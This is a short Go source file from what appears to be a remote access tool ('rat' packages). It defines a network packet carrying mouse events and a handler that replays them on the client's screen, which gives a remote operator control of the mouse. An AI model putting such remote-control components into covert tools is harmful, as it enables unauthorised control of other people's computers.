package main

import "rat/common"
import "rat/client/screen"

type MousePacket struct {
	MonitorID   int `network:"receive"`
	MouseButton int `network:"receive"`
	Type        int `network:"receive"`
}

func (packet MousePacket) Header() common.PacketHeader {
	return common.MouseHeader
}

func (packet MousePacket) OnReceive() error {
	screen.Mouse(packet.MonitorID, packet.MouseButton, packet.Type)
	return nil
}
